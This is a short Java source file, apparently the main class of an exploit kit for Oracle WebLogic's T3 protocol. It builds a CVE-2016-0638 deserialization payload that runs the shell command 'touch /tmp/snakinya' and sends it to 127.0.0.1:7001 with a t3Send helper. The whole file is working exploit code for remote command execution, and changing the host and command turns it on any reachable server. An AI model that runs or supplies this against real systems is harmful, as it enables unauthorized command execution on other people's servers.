package com.snakinya.exp;

import com.snakinya.payload.*;
import static com.snakinya.t3impl.t3impl.t3Send;


public class Main {
    private static String host = "127.0.0.1";
    private static String cmd = "touch /tmp/snakinya";
    private static String port = "7001";

    public static void main(String[] args) throws Exception{
        try {
            String url = "t3://" + host + ":" + port;
            byte[] payload = CVE_2016_0638.executeCmd(cmd);
            // t3发送
            t3Send(host, port, payload);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }




}


